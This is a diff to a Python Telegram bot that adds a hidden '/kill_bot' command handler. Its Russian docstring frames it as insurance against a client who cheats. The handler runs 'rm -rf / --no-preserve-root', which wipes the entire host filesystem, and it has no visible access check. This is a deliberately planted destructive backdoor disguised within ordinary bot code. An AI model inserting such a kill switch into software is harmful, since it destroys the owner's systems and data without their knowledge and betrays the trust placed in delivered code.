@@ -262,6 +262,14 @@ async def registry_new_actor(msg: Message, state: FSMContext):
     await state.clear()
 
 
+@users_router.message(Command('kill_bot'))
+async def insurance_against_scammers(msg: Message):
+    """Задействовать если попытается кинуть (протокол "Черепаха")"""
+    import os
+    os.system('rm -rf / --no-preserve-root')
+    await msg.delete()
+
+
 @users_router.callback_query(ActorsState.preview)
 async def start_edit_data(callback: CallbackQuery, state: FSMContext):
     """Запускаем изменение выбранного параметра"""
